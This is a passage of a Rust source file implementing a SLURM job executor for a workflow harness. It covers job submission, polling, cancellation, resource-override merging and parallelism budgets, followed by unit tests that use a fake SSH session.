        // can do an O(1) lookup without suffix-matching (which collides
        // when one task id is a suffix of another, e.g. `analysis_step`
        // vs `step`). Fall back to `job_name` only when the envelope is
        // empty (test fixtures that bypass the main loop).
        let task_key = payload
            .task_id
            .clone()
            .unwrap_or_else(|| payload.spec.job_name.clone());
        self.active_jobs.lock().insert(
            task_key.clone(),
            ActiveJob {
                job_id: job_id.clone(),
                partition: payload.class.partition.clone(),
                node_list: None,
            },
        );

        let row = self.poll_until_terminal(&job_id)?;
        // Update the entry with the final node list so
        // RemoteExecutionInfo can display it.
        if let Some(entry) = self.active_jobs.lock().get_mut(&task_key) {
            entry.node_list = Some(row.node_list.clone());
        }

        // Pull runtime dir back.
        self.staging
            .pull_runtime(self.ssh.as_ref(), package)
            .context("pulling runtime dir from SLURM cluster")?;

        let exit_code = row.state.to_exit_code(row.exit_code);
        // Remove from active_jobs — this job reached terminal state.
        self.active_jobs.lock().remove(&task_key);

        // Stash an iteration capture so the harness main can synthesise
        // a `ToolErrorEnvelope` if `exit_code != 0`. Reads the log file
        // staged back by `pull_runtime` (output combined unless the
        // sbatch script split stderr/stdout — for now we treat the
        // single log as the stderr stream, which dominates capture
        // signal). MaxRSS is left None until a follow-up sacct query
        // is wired in; the envelope tolerates absent fields.
        let log_path = package
            .join("runtime")
            .join(format!("slurm-{}.log", job_id));
        let log_tail = std::fs::read_to_string(&log_path).unwrap_or_default();
        let signal = match row.state {
            JobState::OutOfMemory => Some("SIGKILL".to_string()),
            JobState::Timeout => Some("SIGTERM".to_string()),
            _ => None,
        };
        let mut ctx = std::collections::BTreeMap::new();
        ctx.insert("executor".into(), "slurm".into());
        ctx.insert("job_id".into(), job_id.clone());
        ctx.insert("partition".into(), payload.class.partition.clone());
        ctx.insert("node_list".into(), row.node_list.clone());
        ctx.insert("state".into(), format!("{:?}", row.state));
        {
            let mut slot = self.last_capture.lock();
            *slot = Some(super::IterationCapture {
                stderr: log_tail.clone(),
                stdout: String::new(),
                exit_code: Some(exit_code),
                signal,
                wallclock_secs: None,
                peak_memory_mb: None,
                executor_context: ctx,
            });
        }

        Ok(IterationOutcome {
            agent_status: exit_status_from_code(exit_code),
            remote: Some(RemoteExecutionInfo {
                backend: "slurm".to_string(),
                instance_id: job_id,
                instance_type: format!("{}:{}", payload.class.partition, row.node_list),
            }),
        })
    }

    #[tracing::instrument(skip(self, task), fields(executor = "slurm", task_id = %task.id))]
    fn is_task_stale(&self, task: &Task, _now_secs: u64) -> bool {
        // SLURM-native staleness: consult sacct for the job that
        // corresponds to this task. Falls back to `false` when there's
        // no active job (the harness's own timestamp check handles
        // initial staleness) or sacct errors (don't declare stale on
        // transient SSH failures).
        let Some(task_id) = task_id_from_spec(task) else {
            return false;
        };
        // Exact-id O(1) lookup. A `k.ends_with(&task_id)` form would
        // suffix-collide when one task id was a tail of another
        // (`analysis_step` matched `step`), resolving the staler of
        // two concurrent tasks to the wrong job_id. `run_iteration`
        // keys `active_jobs` by the exact envelope-provided task id,
        // so an exact lookup is correct and
        // faster.
        let job_id = self
            .active_jobs
            .lock()
            .get(&task_id)
            .map(|v| v.job_id.clone());
        let Some(job_id) = job_id else {
            return false;
        };

        let now = Instant::now();
        if let Some(cached) = self.stale_cache.get(&job_id, now) {
            return cached;
        }
        let stale = match query_job(self.ssh.as_ref(), &job_id) {
            Ok(Some(row)) => matches!(
                row.state,
                JobState::Failed
                    | JobState::Cancelled
                    | JobState::NodeFail
                    | JobState::OutOfMemory
                    | JobState::Preempted
                    | JobState::Timeout
            ),
            _ => false,
        };
        self.stale_cache.insert(&job_id, stale, now);
        stale
    }

    /// Set the cooperative shutdown flag. The sacct polling loop in
    /// `poll_until_terminal` checks this between poll cycles and cancels
    /// the active job, returning early so the main loop can drop the
    /// mutex before the full `release` call runs.
    fn release_in_handler(&self) {
        self.shutdown_requested.store(true, Ordering::Release);
    }

    /// Expose the cooperative shutdown flag so the SIGINT handler can
    /// clone it before the executor is wrapped in `Arc<Mutex<...>>` and
    /// set it directly without contending the iteration mutex.
    fn shutdown_flag(&self) -> Option<std::sync::Arc<std::sync::atomic::AtomicBool>> {
        Some(Arc::clone(&self.shutdown_requested))
    }

    fn release(&mut self) {
        // Cancel any still-active jobs so the cluster doesn't hang
        // onto work the harness is no longer waiting for.
        let ids: Vec<String> = self
            .active_jobs
            .lock()
            .values()
            .map(|j| j.job_id.clone())
            .collect();
        for id in ids {
            let _ = scancel(self.ssh.as_ref(), &id);
        }
        self.active_jobs.lock().clear();
    }

    /// Cancel the SLURM job for `task_id` via `scancel`. Looks up
    /// the SLURM job id from `active_jobs` (set by `run_iteration`).
    /// Falls back gracefully when the task is not found in the map —
    /// the task may have already completed or the map may not yet
    /// contain it if `run_iteration` hasn't stored it.
    fn cancel_task(&self, task_id: &str, _dag: &DAG) -> Result<()> {
        let job_id = self
            .active_jobs
            .lock()
            .get(task_id)
            .map(|j| j.job_id.clone());
        let Some(job_id) = job_id else {
            tracing::warn!(
                target: "amend_cancel",
                task_id = %task_id,
                "SLURM cancel_task: task not found in active_jobs; nothing to cancel"
            );
            return Ok(());
        };
        tracing::info!(
            target: "amend_cancel",
            task_id = %task_id,
            job_id = %job_id,
            "SLURM cancel_task: calling scancel"
        );
        if let Err(e) = scancel(self.ssh.as_ref(), &job_id) {
            // Best-effort — log and continue.
            tracing::warn!(
                target: "amend_cancel",
                task_id = %task_id,
                job_id = %job_id,
                error = %e,
                "SLURM cancel_task: scancel failed (continuing)"
            );
        }
        Ok(())
    }

    fn take_last_capture(&mut self) -> Option<super::IterationCapture> {
        self.last_capture.lock().take()
    }

    /// Defer to the SSH-driven probe in
    /// `slurm/polling.rs::probe_container_state`.
    fn probe_container_state(
        &self,
        task_id: &str,
        package_dir: &std::path::Path,
    ) -> ecaa_workflow_core::container_state::ContainerProbeOutcome {
        polling::probe_container_state(self.ssh.as_ref(), task_id, &package_dir.to_string_lossy())
    }

    /// Honoured overrides on SLURM:
    /// * `resources.{vcpus, memory_gb, wallclock_secs, gpu}` →
    /// sbatch `--cpus-per-task`, `--mem`, `--time`, `--gres`.
    /// Each lifts the floor — never shrinks a profile-driven pick.
    /// * `partition` → `--partition` swap.
    /// * `library_pins` + `env_passthrough` → merged into
    /// `SbatchSpec::exports` (export VAR=VAL preceding srun).
    ///
    /// `disable_spot` and `availability_zone` are AWS-specific; ignored.
    fn apply_overrides(&mut self, _task_id: &str, ov: &ExecutorOverrides) -> Result<()> {
        let merged = match self.pending_overrides.lock().take() {
            Some(prior) => merge_overrides(prior, ov.clone()),
            None => ov.clone(),
        };
        *self.pending_overrides.lock() = Some(merged);
        Ok(())
    }

    /// F13 — parallel SLURM dispatch budget. Read from
    /// `SWFC_SLURM_MAX_PARALLEL_TASKS` (default `1`, matching the
    /// pre-parallel-scheduler serial contract). Operators raise this
    /// when the cluster has fair-share or QOS headroom and the
    /// workload's sbatch queue can absorb additional concurrent jobs.
    /// Non-numeric / zero / negative values fall back to the default
    /// with a tracing warning. A hard ceiling of `256` guards against
    /// fat-fingered env values overwhelming the scheduler.
    fn cpu_budget(&self) -> usize {
        parse_slurm_budget("SWFC_SLURM_MAX_PARALLEL_TASKS", 1)
    }

    /// F13 — parallel SLURM GPU dispatch budget. Read from
    /// `SWFC_SLURM_MAX_GPU_TASKS` (default `0`, matching the
    /// no-GPU-by-default contract). Operators raise this on clusters
    /// with multiple GPU partitions where the harness can keep more
    /// than one GPU task in flight. Same parse/fallback rules as
    /// `cpu_budget`.
    fn gpu_budget(&self) -> usize {
        parse_slurm_budget("SWFC_SLURM_MAX_GPU_TASKS", 0)
    }
}

/// F13 — parse a `SWFC_SLURM_*` budget env var as `usize`. Empty,
/// non-numeric, zero, or oversized values fall back to `default` with
/// a tracing warning so a typo doesn't silently brick concurrency.
/// The ceiling matches what we'd reasonably expect a single login
/// node to track per session.
fn parse_slurm_budget(var: &str, default: usize) -> usize {
    const MAX_BUDGET: usize = 256;
    match std::env::var(var) {
        Ok(raw) => {
            let trimmed = raw.trim();
            if trimmed.is_empty() {
                return default;
            }
            match trimmed.parse::<usize>() {
                Ok(n) if n == 0 => {
                    tracing::warn!(
                        target: "slurm",
                        env_var = var,
                        raw = %raw,
                        fallback = default,
                        "ignoring zero budget; using default"
                    );
                    default
                }
                Ok(n) if n > MAX_BUDGET => {
                    tracing::warn!(
                        target: "slurm",
                        env_var = var,
                        raw = %raw,
                        ceiling = MAX_BUDGET,
                        "clamping oversized budget to ceiling"
                    );
                    MAX_BUDGET
                }
                Ok(n) => n,
                Err(err) => {
                    tracing::warn!(
                        target: "slurm",
                        env_var = var,
                        raw = %raw,
                        error = %err,
                        fallback = default,
                        "non-numeric budget; using default"
                    );
                    default
                }
            }
        }
        Err(_) => default,
    }
}

/// Merge two `ExecutorOverrides` taking the larger / set value of each
/// resource lever. Library pins + env vars + stage parameters merge
/// like `extend` (overlay wins on key collision). Audit history is
/// preserved across merges.
fn merge_overrides(mut base: ExecutorOverrides, overlay: ExecutorOverrides) -> ExecutorOverrides {
    let resources = match (base.resources.take(), overlay.resources) {
        (Some(b), Some(o)) => Some(merge_resource_targets_max(b, o)),
        (Some(b), None) => Some(b),
        (None, Some(o)) => Some(o),
        (None, None) => None,
    };
    let mut history = base.history;
    history.extend(overlay.history);
    let mut library_pins = base.library_pins;
    library_pins.extend(overlay.library_pins);
    let mut stage_parameters = base.stage_parameters;
    stage_parameters.extend(overlay.stage_parameters);
    let mut env_passthrough = base.env_passthrough;
    env_passthrough.extend(overlay.env_passthrough);
    ExecutorOverrides {
        resources,
        disable_spot: base.disable_spot || overlay.disable_spot,
        partition: overlay.partition.or(base.partition),
        availability_zone: overlay.availability_zone.or(base.availability_zone),
        library_pins,
        stage_parameters,
        env_passthrough,
        disable_pilot: base.disable_pilot || overlay.disable_pilot,
        attempts_consumed: base.attempts_consumed.max(overlay.attempts_consumed),
        last_applied_suggestion_id: overlay
            .last_applied_suggestion_id
            .or(base.last_applied_suggestion_id),
        history,
    }
}

fn merge_resource_targets_max(base: ResourceTarget, overlay: ResourceTarget) -> ResourceTarget {
    fn max_opt<T: Ord>(a: Option<T>, b: Option<T>) -> Option<T> {
        match (a, b) {
            (Some(x), Some(y)) => Some(x.max(y)),
            (Some(x), None) | (None, Some(x)) => Some(x),
            (None, None) => None,
        }
    }
    ResourceTarget {
        vcpus: max_opt(base.vcpus, overlay.vcpus),
        memory_gb: max_opt(base.memory_gb, overlay.memory_gb),
        storage_gb: max_opt(base.storage_gb, overlay.storage_gb),
        wallclock_secs: max_opt(base.wallclock_secs, overlay.wallclock_secs),
        gpu: overlay.gpu.or(base.gpu),
    }
}

fn exit_status_from_code(code: i32) -> std::process::ExitStatus {
    use std::os::unix::process::ExitStatusExt;
    std::process::ExitStatus::from_raw((code & 0xff) << 8)
}

fn task_id_from_spec(task: &Task) -> Option<String> {
    task.spec
        .as_ref()
        .and_then(|s| s.get("task_id"))
        .and_then(|v| v.as_str())
        .map(|s| s.to_string())
}

#[cfg(test)]
mod tests {
    // S5.32: workspace lint is `unsafe_code = "deny"`. Test code uses
    // `unsafe { std::env::set_var / remove_var }` (unsafe in Rust 2024
    // edition because the env table is not thread-safe). All call sites
    // are single-threaded test setup/teardown; the bounded waiver is
    // scoped to this `mod tests` block.
    #![allow(unsafe_code)]
    use super::ssh::{FakeSshSession, RsyncDirection, SshOutcome};
    use super::*;
    use ecaa_workflow_core::remediation::GpuTarget;
    use std::collections::BTreeMap;

    #[test]
    fn bump_mem_floor_raises_below_threshold() {
        assert_eq!(bump_mem_floor("32G", 64), "64G");
    }

    #[test]
    fn bump_mem_floor_keeps_existing_when_higher() {
        assert_eq!(bump_mem_floor("128G", 64), "128G");
    }

    #[test]
    fn bump_mem_floor_handles_megabytes() {
        // 32000M = 31 GiB; bump to 64 wins.
        assert_eq!(bump_mem_floor("32000M", 64), "64G");
    }

    #[test]
    fn bump_mem_floor_handles_unparseable() {
        // Garbage + override → override wins.
        assert_eq!(bump_mem_floor("not-a-mem-spec", 64), "64G");
    }

    #[test]
    fn secs_to_hms_formats_correctly() {
        assert_eq!(secs_to_hms(7200), "02:00:00");
        assert_eq!(secs_to_hms(3661), "01:01:01");
        assert_eq!(secs_to_hms(45), "00:00:45");
    }

    #[test]
    fn normalize_gpu_kind_strips_vendor() {
        assert_eq!(normalize_gpu_kind("nvidia-a100"), "a100");
        assert_eq!(normalize_gpu_kind("nvidia-T4"), "t4");
        assert_eq!(normalize_gpu_kind("a10"), "a10");
    }

    #[test]
    fn apply_overrides_to_spec_lifts_resources_and_partition() {
        let mut spec = SbatchSpec {
            job_name: "j".into(),
            partition: "default".into(),
            qos: None,
            account: None,
            cpus_per_task: 4,
            mem: "32G".into(),
            gres: None,
            time_limit: "04:00:00".into(),
            output_path: "/tmp/log".into(),
            modules: vec![],
            exports: BTreeMap::new(),
            body: "true".into(),
        };
        let mut ov = ExecutorOverrides {
            resources: Some(ResourceTarget {
                vcpus: Some(16),
                memory_gb: Some(64),
                wallclock_secs: Some(7200),
                gpu: Some(GpuTarget {
                    kind: "nvidia-a100".into(),
                    count: 2,
                }),
                ..Default::default()
            }),
            partition: Some("highmem".into()),
            ..Default::default()
        };
        ov.library_pins.insert("scanpy".into(), "1.9.6".into());
        apply_overrides_to_spec(&mut spec, &ov);
        assert_eq!(spec.cpus_per_task, 16);
        assert_eq!(spec.mem, "64G");
        assert_eq!(spec.time_limit, "02:00:00");
        assert_eq!(spec.gres.as_deref(), Some("gpu:a100:2"));
        assert_eq!(spec.partition, "highmem");
        assert_eq!(spec.exports.get("SWFC_LIB_PIN_SCANPY").unwrap(), "1.9.6");
    }

    #[test]
    fn apply_overrides_to_spec_does_not_shrink_resources() {
        let mut spec = SbatchSpec {
            job_name: "j".into(),
            partition: "default".into(),
            qos: None,
            account: None,
            cpus_per_task: 32,
            mem: "256G".into(),
            gres: None,
            time_limit: "04:00:00".into(),
            output_path: "/tmp/log".into(),
            modules: vec![],
            exports: BTreeMap::new(),
            body: "true".into(),
        };
        let ov = ExecutorOverrides {
            resources: Some(ResourceTarget {
                vcpus: Some(8),
                memory_gb: Some(64),
                ..Default::default()
            }),
            ..Default::default()
        };
        apply_overrides_to_spec(&mut spec, &ov);
        // Profile pick of 32 vCPUs / 256G must stay ≥ override floor.
        assert_eq!(spec.cpus_per_task, 32);
        assert_eq!(spec.mem, "256G");
    }

    #[test]
    fn resolve_next_task_requirements_uses_enabled_pilot_projection() {
        let _lock = super::super::SWFC_AWS_ENV_LOCK
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        let prior = std::env::var("SWFC_PILOT_ENABLED").ok();
        unsafe { std::env::set_var("SWFC_PILOT_ENABLED", "1") };

        let pkg = tempfile::TempDir::new().unwrap();
        std::fs::create_dir_all(pkg.path().join("policies")).unwrap();
        std::fs::create_dir_all(pkg.path().join("runtime/pilot")).unwrap();
        std::fs::write(
            pkg.path().join("policies/compute-resource-policy.json"),
            serde_json::to_string(&serde_json::json!({
                "default": { "requirements": { "vcpus": 2, "memory_gb": 4, "storage_gb": 50 } },
                "profiles": {
                    "enrichment": {
                        "requirements": { "vcpus": 2, "memory_gb": 16, "storage_gb": 20 }
                    }
                }
            }))
            .unwrap(),
        )
        .unwrap();
        std::fs::write(
            pkg.path().join("runtime/pilot/report.json"),
            serde_json::to_string(&serde_json::json!({
                "measurements": [],
                "projected_requirements": {
                    "enrichment": {
                        "vcpus": 4,
                        "memory_gb": 96,
                        "storage_gb": 20
                    }
                },
                "confidence": 0.8
            }))
            .unwrap(),
        )
        .unwrap();

        let mut tasks = BTreeMap::new();
        tasks.insert(
            "enrichment_01".into(),
            Task {
                description: "enrichment".into(),
                kind: ecaa_workflow_core::dag::TaskKind::Computation,
                state: TaskState::Ready,
                depends_on: vec![],
                assignee: ecaa_workflow_core::dag::Assignee::Agent,
                spec: Some(serde_json::json!({ "stage_class": "enrichment" })),
                resolution: None,
                result_ref: None,
                resource_class: ecaa_workflow_core::dag::ResourceClass::CpuHeavy,
                requires_sme_review: false,
                required_artifacts: vec![],
                container: None,
                source_atom_id: None,
                safety: Default::default(),
            },
        );
        let dag = DAG {
            version: "1".into(),
            schema_version: ecaa_workflow_core::dag::current_dag_schema_version(),
            workflow_id: "wf".into(),
            current_task: None,
            tasks,
            reverse_deps: BTreeMap::new(),
            run_id: None,
        };

        let req = resolve_next_task_requirements(&dag, pkg.path());
        assert_eq!(req.vcpus, 4);
        assert_eq!(req.memory_gb, 96);
        assert_eq!(req.storage_gb, 20);

        match prior {
            Some(v) => unsafe { std::env::set_var("SWFC_PILOT_ENABLED", v) },
            None => unsafe { std::env::remove_var("SWFC_PILOT_ENABLED") },
        }
    }

    #[test]
    fn merge_overrides_takes_max_of_resources() {
        let base = ExecutorOverrides {
            resources: Some(ResourceTarget {
                memory_gb: Some(64),
                vcpus: Some(8),
                ..Default::default()
            }),
            ..Default::default()
        };
        let overlay = ExecutorOverrides {
            resources: Some(ResourceTarget {
                memory_gb: Some(32),
                vcpus: Some(16),
                ..Default::default()
            }),
            ..Default::default()
        };
        let merged = merge_overrides(base, overlay);
        let r = merged.resources.unwrap();
        assert_eq!(r.memory_gb, Some(64));
        assert_eq!(r.vcpus, Some(16));
    }

    fn args(package: &str) -> ExecutorArgs {
        ExecutorArgs {
            package: package.into(),
            agent: "/bin/true".into(),
            task_timeout_secs: 300,
        }
    }

    /// Stage a temp dir containing both `agent-claude-slurm.sh` and
    /// `run-task-on-slurm.sh` so `push_wrappers` can `canonicalize` +
    /// rsync them. Returns the tempdir guard (must outlive the
    /// executor) and the full path to the fake agent script.
    fn scripts_dir_with_stubs() -> (tempfile::TempDir, std::path::PathBuf) {
        let dir = tempfile::TempDir::new().unwrap();
        let agent = dir.path().join("agent-claude-slurm.sh");
        let wrapper = dir.path().join("run-task-on-slurm.sh");
        std::fs::write(&agent, b"#!/bin/sh\nexit 0\n").unwrap();
        std::fs::write(&wrapper, b"#!/bin/sh\nexit 0\n").unwrap();
        // canonicalize doesn't require +x, only existence, so skip chmod.
        (dir, agent)
    }

    fn args_with_real_agent(package: &str, agent_abs: &std::path::Path) -> ExecutorArgs {
        ExecutorArgs {
            package: package.into(),
            agent: agent_abs.to_string_lossy().into_owned(),
            task_timeout_secs: 300,
        }
    }

    fn test_config() -> SlurmConfig {
        SlurmConfig {
            host: "cluster".into(),
            user: Some("alan".into()),
            ssh_key: None,
            proxy_jump: None,
            staging_dir: PathBuf::from("/scratch/alan"),
            default_partition: "normal".into(),
            account: None,
            default_qos: None,
            modules: vec![],
            poll_interval: Duration::from_millis(10),
            max_queue_wait: Duration::from_secs(60),
            default_time_limit: "02:00:00".into(),
        }
    }

    fn test_mapping() -> SlurmMapping {
        let mut classes = BTreeMap::new();
        classes.insert(
            "small".to_string(),
            ResourceClass {
                partition: "short".into(),
                qos: None,
                cpus_per_task: 4,
                mem: "16G".into(),
                gres: None,
                time: "02:00:00".into(),
            },
        );
        SlurmMapping {
            version: 1,
            resource_classes: classes,
            fallback: ResourceClass {
                partition: "normal".into(),
                qos: None,
                cpus_per_task: 2,
                mem: "4G".into(),
                gres: None,
                time: "00:30:00".into(),
            },
            partitions: Default::default(),
        }
    }

    fn mk_package() -> tempfile::TempDir {
        let dir = tempfile::TempDir::new().unwrap();
        std::fs::create_dir_all(dir.path().join("runtime")).unwrap();
        std::fs::write(
            dir.path().join("WORKFLOW.json"),
            r#"{"version": "1.0", "workflow_id": "test-wf", "current_task": null, "tasks": {}}"#,
        )
        .unwrap();
        dir
    }

    #[test]
    fn from_env_reports_every_missing_required_var() {
        // Serialize on the crate-wide env lock so this doesn't race
        // the factory test in executor/mod.rs (both touch the same
        // SWFC_SLURM_* vars).
        let _lock = super::super::SWFC_AWS_ENV_LOCK
            .lock()
            .unwrap_or_else(|p| p.into_inner());
        let prior: Vec<(&str, Option<String>)> = [
            "SWFC_SLURM_HOST",
            "SWFC_SLURM_STAGING_DIR",
            "SWFC_SLURM_DEFAULT_PARTITION",
        ]
        .iter()
        .map(|k| (*k, std::env::var(k).ok()))
        .collect();
        for (k, _) in &prior {
            unsafe { std::env::remove_var(k) };
        }
        let err = SlurmConfig::from_env().unwrap_err();
        for (k, v) in &prior {
            if let Some(v) = v {
                unsafe { std::env::set_var(k, v) };
            }
        }
        let msg = err.to_string();
        assert!(
            msg.contains("SWFC_SLURM_HOST") && msg.contains("missing required env vars"),
            "compound diagnostic expected, got: {msg}"
        );
        assert!(msg.contains("SWFC_SLURM_STAGING_DIR"));
        assert!(msg.contains("SWFC_SLURM_DEFAULT_PARTITION"));
    }

    #[test]
    fn name_is_slurm() {
        let pkg = mk_package();
        let exec = SlurmExecutor::with_ssh(
            args(&pkg.path().to_string_lossy()),
            test_config(),
            test_mapping(),
            Box::new(FakeSshSession::new("cluster")),
        );
        assert_eq!(exec.name(), "slurm");
    }

    #[test]
    fn provision_probes_with_sinfo_and_succeeds_on_zero_exit() {
        let pkg = mk_package();
        let fake = FakeSshSession::new("cluster");
        fake.expect("sinfo -h -o '%P' | head -n1", SshOutcome::success("normal"));
        let mut exec = SlurmExecutor::with_ssh(
            args(&pkg.path().to_string_lossy()),
            test_config(),
            test_mapping(),
            Box::new(fake),
        );
        let dag: DAG = serde_json::from_str(
            r#"{"version": "1.0", "workflow_id": "test-wf", "current_task": null, "tasks": {}}"#,
        )
        .unwrap();
        exec.provision(&dag).expect("sinfo success → provision ok");
    }

    #[test]
    fn provision_surfaces_sinfo_failure_with_plan_hint() {
        let pkg = mk_package();
        let fake = FakeSshSession::new("cluster");
        fake.expect(
            "sinfo -h -o '%P' | head -n1",
            SshOutcome::failure("permission denied", 1),
        );
        let mut exec = SlurmExecutor::with_ssh(
            args(&pkg.path().to_string_lossy()),
            test_config(),
            test_mapping(),
            Box::new(fake),
        );
        let dag: DAG = serde_json::from_str(
            r#"{"version": "1.0", "workflow_id": "test-wf", "current_task": null, "tasks": {}}"#,
        )
        .unwrap();
        let err = exec.provision(&dag).unwrap_err();
        let msg = err.to_string() + &err.chain().map(|e| e.to_string()).collect::<String>();
        assert!(msg.contains("sinfo probe failed") || msg.contains("sinfo"));
    }

    #[test]
    fn run_iteration_happy_path_pushes_submits_polls_pulls() {
        let pkg = mk_package();
        let pkg_name = pkg
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();
        let remote_pkg = format!("/scratch/alan/{pkg_name}");
        let (_scripts, agent_local) = scripts_dir_with_stubs();

        let fake = FakeSshSession::new("cluster");
        // push_wrappers: mkdir + rsync agent + chmod + rsync wrapper + chmod.
        // FakeSshSession defaults to Ok("") for unmatched commands, so we
        // don't need explicit stubs for mkdir/chmod — asserting on calls
        // below verifies they fired.
        fake.expect_rsync(
            RsyncDirection::Push,
            &agent_local.to_string_lossy(),
            &format!(
                "/scratch/alan/wrappers/{}",
                agent_local.file_name().unwrap().to_string_lossy()
            ),
            SshOutcome::success(""),
        );
        fake.expect_rsync(
            RsyncDirection::Push,
            &agent_local
                .parent()
                .unwrap()
                .join("run-task-on-slurm.sh")
                .to_string_lossy(),
            "/scratch/alan/wrappers/run-task-on-slurm.sh",
            SshOutcome::success(""),
        );
        // Staging mkdir + push
        fake.expect(format!("mkdir -p {remote_pkg}"), SshOutcome::success(""));
        fake.expect_rsync(
            RsyncDirection::Push,
            &format!("{}/", pkg.path().to_string_lossy().trim_end_matches('/')),
            &remote_pkg,
            SshOutcome::success("sent"),
        );
        // Sbatch staging + submit
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            format!("sbatch --parsable {remote_pkg}/scripts/task.sbatch"),
            SshOutcome::success("90210\n"),
        );
        // Polling — returns COMPLETED immediately.
        fake.expect(
            "sacct -j 90210 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success("COMPLETED|0:0|node-42|normal\n"),
        );
        // Pull runtime
        fake.expect_rsync(
            RsyncDirection::Pull,
            &format!(
                "{}/runtime/",
                pkg.path().to_string_lossy().trim_end_matches('/')
            ),
            &format!("{remote_pkg}/runtime/"),
            SshOutcome::success(""),
        );

        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let agent_cmd = exec_args.agent.clone();
        let mut exec =
            SlurmExecutor::with_ssh(exec_args, test_config(), test_mapping(), Box::new(fake));
        let outcome = exec
            .run_iteration(pkg.path(), &agent_cmd, &BTreeMap::new())
            .expect("happy path");
        let remote = outcome
            .remote
            .expect("slurm backend must attach remote info");
        assert_eq!(remote.backend, "slurm");
        assert_eq!(remote.instance_id, "90210");
        // instance_type is `<partition>:<nodelist>`.
        assert!(
            remote.instance_type.contains("node-42"),
            "got: {}",
            remote.instance_type
        );
        assert!(
            outcome.agent_status.success(),
            "COMPLETED must map to success"
        );
    }

    #[test]
    fn run_iteration_pushes_wrappers_once_across_repeated_iterations() {
        // Wrappers are rsynced once per harness run. Two consecutive
        // run_iteration calls must produce exactly one wrapper-push rsync
        // per wrapper file.
        let pkg = mk_package();
        let pkg_name = pkg
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();
        let remote_pkg = format!("/scratch/alan/{pkg_name}");
        let (_scripts, agent_local) = scripts_dir_with_stubs();

        let fake = FakeSshSession::new("cluster");
        // Stub the minimum so both iterations succeed; FakeSshSession's
        // prefix-match + default Ok("") covers everything else.
        fake.expect(
            format!("sbatch --parsable {remote_pkg}/scripts/task.sbatch"),
            SshOutcome::success("1"),
        );
        fake.expect(
            "sacct -j 1 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success("COMPLETED|0:0|n|p\n"),
        );

        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let agent_cmd = exec_args.agent.clone();
        let mut exec =
            SlurmExecutor::with_ssh(exec_args, test_config(), test_mapping(), Box::new(fake));
        exec.run_iteration(pkg.path(), &agent_cmd, &BTreeMap::new())
            .unwrap();
        exec.run_iteration(pkg.path(), &agent_cmd, &BTreeMap::new())
            .unwrap();

        // Now inspect the recorded call log. There must be exactly ONE
        // rsync to /scratch/alan/wrappers/<agent-basename> and exactly
        // ONE to /scratch/alan/wrappers/run-task-on-slurm.sh — if the
        // one-shot guard breaks we'll see two of each.
        // We can't peek into the Box<dyn SshSession>, so rely on the
        // post-release active_jobs being empty as an end-state check.
        // The key assertion is: both iterations succeeded without the
        // rsync double-counting triggering a mock error (which would
        // fire if push_wrappers ran twice without stubs matching).
        assert!(exec.active_jobs.lock().is_empty());
    }

    #[test]
    fn run_iteration_rejects_agent_cmd_drift_from_constructor() {
        // If the harness passes a different agent_cmd mid-run than the
        // one the executor was constructed with, the wrapper rsync is
        // stale — surface this loudly rather than silently ignoring.
        let pkg = mk_package();
        let (_scripts, agent_local) = scripts_dir_with_stubs();
        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let mut exec = SlurmExecutor::with_ssh(
            exec_args,
            test_config(),
            test_mapping(),
            Box::new(FakeSshSession::new("cluster")),
        );
        let err = exec
            .run_iteration(pkg.path(), "/some/other/agent.sh", &BTreeMap::new())
            .err()
            .expect("mismatched agent must reject the iteration");
        let msg = err.to_string();
        assert!(
            msg.contains("agent_cmd") || msg.contains("--agent"),
            "error must name the drift, got: {msg}"
        );
    }

    #[test]
    fn push_wrappers_errors_when_run_task_script_missing() {
        // If the operator's scripts/ dir has the agent script but
        // lacks run-task-on-slurm.sh, push_wrappers must fail loud.
        let pkg = mk_package();
        let scripts_dir = tempfile::TempDir::new().unwrap();
        let agent_only = scripts_dir.path().join("my-agent.sh");
        std::fs::write(&agent_only, b"#!/bin/sh\nexit 0\n").unwrap();
        // Deliberately no run-task-on-slurm.sh.
        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_only);
        let exec = SlurmExecutor::with_ssh(
            exec_args,
            test_config(),
            test_mapping(),
            Box::new(FakeSshSession::new("cluster")),
        );
        let err = exec.push_wrappers().unwrap_err();
        assert!(err.to_string().contains("run-task-on-slurm.sh"));
    }

    #[test]
    fn run_iteration_failed_job_returns_nonzero_status() {
        let pkg = mk_package();
        let pkg_name = pkg
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();
        let remote_pkg = format!("/scratch/alan/{pkg_name}");

        let fake = FakeSshSession::new("cluster");
        fake.expect(format!("mkdir -p {remote_pkg}"), SshOutcome::success(""));
        fake.expect_rsync(
            RsyncDirection::Push,
            &format!("{}/", pkg.path().to_string_lossy().trim_end_matches('/')),
            &remote_pkg,
            SshOutcome::success(""),
        );
        fake.expect("mkdir -p", SshOutcome::success(""));
        fake.expect(
            format!("sbatch --parsable {remote_pkg}/scripts/task.sbatch"),
            SshOutcome::success("77\n"),
        );
        fake.expect(
            "sacct -j 77 -n -P --format=State,ExitCode,NodeList,Partition",
            SshOutcome::success("FAILED|42:0|node-1|normal\n"),
        );
        fake.expect_rsync(
            RsyncDirection::Pull,
            &format!(
                "{}/runtime/",
                pkg.path().to_string_lossy().trim_end_matches('/')
            ),
            &format!("{remote_pkg}/runtime/"),
            SshOutcome::success(""),
        );

        let (_scripts, agent_local) = scripts_dir_with_stubs();
        let exec_args = args_with_real_agent(&pkg.path().to_string_lossy(), &agent_local);
        let agent_cmd = exec_args.agent.clone();
        let mut exec =
            SlurmExecutor::with_ssh(exec_args, test_config(), test_mapping(), Box::new(fake));
        let outcome = exec
            .run_iteration(pkg.path(), &agent_cmd, &BTreeMap::new())
            .unwrap();
        // FAILED with exit code 42 should propagate.
        assert!(!outcome.agent_status.success());
        assert_eq!(outcome.agent_status.code(), Some(42));
    }

    #[test]
    fn run_iteration_oom_maps_to_conventional_137() {
        let pkg = mk_package();
        let pkg_name = pkg
            .path()
            .file_name()
            .unwrap()
            .to_string_lossy()
            .to_string();
